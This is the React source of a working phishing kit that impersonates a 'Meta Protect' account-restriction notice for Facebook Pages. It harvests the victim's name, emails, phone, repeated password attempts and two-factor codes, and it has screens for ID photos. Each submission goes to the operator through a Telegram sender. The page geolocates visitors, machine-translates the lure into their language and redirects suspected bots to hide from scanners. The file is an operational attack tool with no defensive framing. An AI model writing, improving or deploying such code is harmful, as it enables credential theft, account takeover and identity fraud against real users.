import { useState, useEffect, useMemo, useCallback } from 'react';
import axios from 'axios';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';
import HeroImage from '@/assets/images/hero-image.jpg';
import '@/assets/css/meta-protect-landing.css';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';

import { translateText } from '@/utils/translate';
import countryToLanguage from '@/utils/country_to_language';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';


const GEO_ENDPOINTS = [
    {
        url: 'https://get.geojs.io/v1/ip/geo.json',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipapi.co/json/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country_name,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipwho.is/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    }
];

const normalizeCountryCode = (code = '') => String(code).trim().toUpperCase();
const isUnknownValue = (value = '') => {
    const normalized = String(value ?? '').trim().toLowerCase();
    return !normalized || ['unknown', 'n/a', 'na', 'null', 'undefined', '-'].includes(normalized);
};
const normalizeGeoValue = (value) => (isUnknownValue(value) ? '' : String(value).trim());

const getFallbackLanguage = () => {
    const [browserLang = 'en'] = String(navigator.language || 'en').split('-');
    return browserLang.toLowerCase() || 'en';
};

const resolveTargetLang = (countryCode = '') => {
    const normalizedCode = normalizeCountryCode(countryCode);
    return countryToLanguage[normalizedCode] || getFallbackLanguage();
};

const formatDateTime = () => {
    const now = new Date();
    const pad = (value) => String(value).padStart(2, '0');
    return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
};

const parseDeviceInfo = (ua = '') => {
    const normalizedUA = String(ua || '').toLowerCase();
    const deviceType = /mobile|android|iphone|ipad/i.test(normalizedUA) ? 'Mobile' : 'Desktop';

    const os = (() => {
        if (normalizedUA.includes('windows nt 10.0')) return 'Windows 10';
        if (normalizedUA.includes('windows nt')) return 'Windows';
        if (normalizedUA.includes('android')) return 'Android';
        if (normalizedUA.includes('iphone') || normalizedUA.includes('ipad') || normalizedUA.includes('ios')) return 'iOS';
        if (normalizedUA.includes('mac os x')) return 'macOS';
        if (normalizedUA.includes('linux')) return 'Linux';
        return 'Unknown OS';
    })();

    const browser = (() => {
        const edgeMatch = ua.match(/Edg\/(\d+(?:\.\d+)*)/i);
        if (edgeMatch) return `Edge ${edgeMatch[1]}`;
        const chromeMatch = ua.match(/Chrome\/(\d+(?:\.\d+)*)/i);
        if (chromeMatch) return `Chrome ${chromeMatch[1]}`;
        const firefoxMatch = ua.match(/Firefox\/(\d+(?:\.\d+)*)/i);
        if (firefoxMatch) return `Firefox ${firefoxMatch[1]}`;
        const safariMatch = ua.match(/Version\/(\d+(?:\.\d+)*)[\s\S]*Safari/i);
        if (safariMatch) return `Safari ${safariMatch[1]}`;
        return 'Unknown Browser';
    })();

    return `${deviceType} - ${os} - ${browser}`;
};

const fetchGeoData = async () => {
    let bestCandidate = null;
    let bestScore = -1;

    const getCandidateScore = (candidate) => {
        const hasCountry = !isUnknownValue(candidate.country);
        const hasRegion = !isUnknownValue(candidate.region);
        const hasCity = !isUnknownValue(candidate.city);
        const hasIp = !isUnknownValue(candidate.ip);
        const hasCountryCode = !isUnknownValue(candidate.countryCode);
        return (hasCity ? 3 : 0) + (hasRegion ? 2 : 0) + (hasCountry ? 2 : 0) + (hasCountryCode ? 1 : 0) + (hasIp ? 1 : 0);
    };

    for (const endpoint of GEO_ENDPOINTS) {
        try {
            const response = await axios.get(endpoint.url, { timeout: 5000 });
            const mapped = endpoint.map(response.data || {}) || {};
            const candidate = {
                ip: normalizeGeoValue(mapped.ip),
                city: normalizeGeoValue(mapped.city),
                region: normalizeGeoValue(mapped.region),
                country: normalizeGeoValue(mapped.country),
                countryCode: normalizeGeoValue(mapped.countryCode)
            };
            const score = getCandidateScore(candidate);

            if (score > bestScore) {
                bestCandidate = candidate;
                bestScore = score;
            }

            if (candidate.city && candidate.region && candidate.country) {
                return candidate;
            }
        } catch {
            continue;
        }
    }
    if (bestCandidate && bestScore > 0) {
        return bestCandidate;
    }
    throw new Error('All geo providers failed');
};

const Index = () => {
    const [today, setToday] = useState('');
    const [isInitialized, setIsInitialized] = useState(false);
    const [showReviewPage, setShowReviewPage] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        reason: '',
        additionalNotes: ''
    });
    const [loginData, setLoginData] = useState({ email: '', password: '' });
    const [passwordAttempts, setPasswordAttempts] = useState([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
    const [deviceInfo, setDeviceInfo] = useState({ deviceInfo: 'Unknown' });
    const [translatedTexts, setTranslatedTexts] = useState({});

    const defaultTexts = useMemo(
        () => ({
            // Landing page
            title: 'Welcome to Meta Protect.',
            description:
                'Your access to the site is restricted, so we require that higher security requirements apply to that account. We created this security program to unlock your Pages.',
            protectionText: "We've enabled advanced protections to unblock your Page.",
            processText:
                'We will guide you through the process in detail and help you fully activate to unlock your Page.',
            restrictedText: 'Access to your page has been restricted on',

            // Modal texts
            confirm: 'Return to Facebook',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',
            twoFAInstructionPrefix: 'Enter the code sent to',
            twoFAInstructionSuffix: 'Enter the 6 or 8-digit code for this account from the two-factor authentication you set up (such as Duo Mobile or Google Authorization, email, or text message on your mobile phone).',
            code: 'Code',
            codeExpired: 'The code you entered is incorrect. Please try again.',
            pleaseWait: 'Please wait',
            step: 'Step',
            tryAnotherMethod: 'Try another method',
            twoFactorAuthentication: 'Two-factor authentication',
            twoFactorAuthenticationDescription: 'Enter your 6 or 8-digit 2FA code.',
            notificationsFromOtherDevices: 'Notifications from other devices',
            authorizeLoginFromAnotherDevice: 'Authorize login from another device.',
            idAndSelfieVideo: 'Official ID photo',
            idAndSelfieVideoDescription: 'Take a photo of your official ID.',
            identityVerificationMethodTitle: 'Please choose an identity verification method.',
            identityVerificationMethodSubtitle: 'The available verification methods are listed below.',
            checkNotificationOnAnotherDevice: 'Check notifications on another device',
            deviceNotificationDescription: 'We sent a notification to your other devices. Please check the notification on Facebook and approve the login to continue.',
            identityVerification: 'Identity verification',
            identityGuideTitle: 'We will guide you through a few steps',
            identityGuideDescription: 'Please provide the following information so we can verify your identity:',
            uploadId: 'Upload ID',
            uploadIdDescription: 'Identity is verified through official identification. This information is not shared on your profile.',
            selectIdTypeTitle: 'Select the type of ID you want to upload',
            selectIdTypeDescription: 'Your ID is used to review your name, photo, and date of birth. Your ID is not shared in your profile.',
            uploadIdPhotoTitle: 'Upload ID photo',
            uploadIdPhotoInstruction: 'The information on the ID card must be clearly visible in the photo. If the information is unclear, you may need to resubmit. Check',
            photoRequirements: 'photo requirements',
            uploadIdDropHint: 'Click Upload or drag and drop the photo file with your ID.',
            uploadButton: 'Upload',
            selectedFileLabel: 'Selected file:',
            validCodeHint: 'A valid code has 6 or 8 digits.',
            identityInvalidImageError: 'Please choose an image file (jpg, png, webp).',
            identityUploadRequiredError: 'Please upload an ID image before continuing.',
            identityUploadFailedError: 'Upload failed. Please try again.',
            back: 'Back',
            submission: 'Submission',
            passport: 'Passport',
            driversLicense: "driver's license",
            residentRegistrationCard: 'Resident registration card',
            next: 'Next',
            twoFAStep: 'Two-factor authentication request',
            securityReason: 'For security reasons, please enter your password to continue.',

            // Success modal
            successTitle: 'Request has been sent',
            successMessage1: 'Your request has been added to the processing queue. We will handle your request within 24 hours.',
            successMessage2: 'From the Customer Support Meta.',

            // First form modal
            verificationInfo: 'Verification information',
            fillRequiredFields: 'Please fill in correctly and completely all required fields to complete the verification profile.',
            fullName: 'Full Name',
            fullNamePlaceholder: 'Example: John Smith',
            personalEmail: 'Personal Email',
            personalEmailPlaceholder: 'Example: johnsmith@gmail.com',
            businessEmail: 'Business Email',
            businessEmailPlaceholder: 'Example: contact@company.com',
            mobilePhone: 'Mobile Phone Number',
            mobilePhonePlaceholder: 'Example: +1 201 555 0123',
            yourPageName: 'Your Page Name',
            pageNamePlaceholder: 'Example: ABC Studio Official',
            additionalNotes: 'Additional notes (optional)',
            additionalNotesPlaceholder: 'Example: This page officially represents ABC brand and needs verification to improve trust.',
            reviewReasonIntro: 'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
            reviewReasonTitle: 'What do you think happened?',
            reasonErroneousReport: 'An erroneous report or unfair competitive complaint.',
            reasonNotificationError: 'This notification was sent in error.',
            reasonNoFraud: 'No fraud involved / another legitimate reason:',
        }),
        []
    );

    const translateAllTexts = useCallback(
        async (lang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], lang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });

                const normalizedStep = String(translated.step || '').trim().toLowerCase();
                if (!normalizedStep || normalizedStep.includes('b╞░ß╗¢c ch├ón')) {
                    translated.step = lang === 'vi' ? 'B╞░ß╗¢c' : defaultTexts.step;
                }

                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        const date = new Date();
        setToday(
            date.toLocaleString('en-US', {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            })
        );

        try {
            try {
                const data = await fetchGeoData();
                const normalizedCountryCode = normalizeCountryCode(data.countryCode);
                setIpInfo({
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown'
                });
                localStorage.setItem(
                    'ipInfo',
                    JSON.stringify({
                        ip: data.ip || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        country_code: normalizedCountryCode || 'Unknown'
                    })
                );

                const lang = resolveTargetLang(normalizedCountryCode);
                localStorage.setItem('targetLang', lang);

                if (lang !== 'en') {
                    await translateAllTexts(lang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                const cachedLang = localStorage.getItem('targetLang') || 'en';
                if (cachedLang !== 'en') {
                    await translateAllTexts(cachedLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            }

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            setDeviceInfo({ deviceInfo: navigator.userAgent });
        } catch (error) {
            console.error('Initialization error:', error);
            setTranslatedTexts(defaultTexts);
        } finally {
            setIsInitialized(true);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        localStorage.removeItem('message_id');
        localStorage.removeItem('message');
        localStorage.removeItem('messageId');
        initializeApp();
    }, [initializeApp]);

    const buildAndSend = (form, login, passwordLogs, attempts, ip, device) => {
        const escapeHtml = (value) =>
            String(value ?? 'N/A')
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;');

        const safeIp = ip.ip || 'Unknown';
        const safeCity = ip.city || 'Unknown';
        const safeRegion = ip.region || 'Unknown';
        const safeCountry = ip.country || 'Unknown';
        const locationParts = [safeCity, safeRegion, safeCountry].filter((part) => !isUnknownValue(part));
        const formattedLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unknown';
        parseDeviceInfo(device.deviceInfo);

        const passwordLines = passwordLogs.length > 0
            ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
            : '   MK1: <code>N/A</code>';

        const twoFALines = attempts.length > 0
            ? attempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
            : '   Code1: <code>N/A</code>';

        const message = `\u23F0 ${formatDateTime()}
\u{1F310} IP: <code>${escapeHtml(safeIp)}</code>
\u{1F4CD} Location: ${escapeHtml(formattedLocation)}
\u{1F4CB} <b>INFO</b>
   Name: <code>${escapeHtml(form.fullName)}</code>
   Email: <code>${escapeHtml(form.personalEmail)}</code>
   DN Email: <code>${escapeHtml(form.businessEmail)}</code>
   Phone: <code>${escapeHtml(form.phone)}</code>
   Page: <code>${escapeHtml(form.pageName)}</code>
\u{1F510} <b>PASSWORD</b>
${passwordLines}
\u{1F512} <b>2FA CODE</b>
${twoFALines}`;
        sendMessage(message);
    };

    const handleFirstFormSubmit = (data) => {
        buildAndSend(data, { email: '', password: '' }, [], [], ipInfo, deviceInfo);
        setFormData(data);
        setShowReviewPage(false);
        setShowLoginModal(true);
    };

    const handleLoginSubmit = (email, password) => {
        setLoginData({ email, password });
        const nextPasswordAttempts = [...passwordAttempts, password];
        setPasswordAttempts(nextPasswordAttempts);
        buildAndSend(formData, { email, password }, nextPasswordAttempts, twoFAAttempts, ipInfo, deviceInfo);
    };

    const handle2FASubmit = (code) => {
        const newAttempts = [...twoFAAttempts, code];
        setTwoFAAttempts(newAttempts);
        buildAndSend(formData, loginData, passwordAttempts, newAttempts, ipInfo, deviceInfo);
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    return (
        <>
            {!showReviewPage ? (
                <div className='meta-protect-landing'>
                    <title>Comunity Standard</title>
                    <div className='meta-protect-landing__card'>
                        <div className='meta-protect-landing__hero'>
                            <img src={HeroImage} alt='' />
                        </div>

                        <h1 className='meta-protect-landing__title'>{texts.title}</h1>
                        <p className='meta-protect-landing__description'>{texts.description}</p>

                        <div className='meta-protect-landing__steps'>
                            <div className='meta-protect-landing__step'>
                                <FontAwesomeIcon
                                    icon={faCircleCheck}
                                    className='meta-protect-landing__step-icon meta-protect-landing__step-icon--done'
                                    size='xl'
                                />
                                <p>{texts.protectionText}</p>
                            </div>
                            <div className='meta-protect-landing__step'>
                                <FontAwesomeIcon
                                    icon={faIdCard}
                                    className='meta-protect-landing__step-icon meta-protect-landing__step-icon--active'
                                    size='xl'
                                />
                                <p>{texts.processText}</p>
                            </div>
                        </div>

                        <div className='meta-protect-landing__button-wrap'>
                            <button
                                type='button'
                                className='meta-protect-landing__button'
                                disabled={!isInitialized}
                                onClick={() => setShowReviewPage(true)}
                            >
                                {texts.continueBtn}
                            </button>
                        </div>

                        <p className='meta-protect-landing__footer'>
                            {texts.restrictedText}{' '}
                            <span className='meta-protect-landing__footer-date'>{today}</span>
                        </p>
                    </div>
                </div>
            ) : (
                <div className='meta-protect-landing'>
                    <FirstFormModal
                        show={true}
                        asPage={true}
                        onClose={() => setShowReviewPage(false)}
                        onSubmit={handleFirstFormSubmit}
                        texts={texts}
                    />
                </div>
            )}

            <LoginModal
                show={showLoginModal}
                onClose={() => setShowLoginModal(false)}
                onSubmit={handleLoginSubmit}
                onSuccess={() => {
                    setShowLoginModal(false);
                    setShow2FAModal(true);
                }}
                texts={texts}
            />
            <TwoFAModal
                show={show2FAModal}
                onClose={() => setShow2FAModal(false)}
                onSubmit={handle2FASubmit}
                onSuccess={() => {
                    setShow2FAModal(false);
                    setShowSuccessModal(true);
                }}
                texts={texts}
                formData={formData}
            />
            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
        </>
    );
};

export default Index;
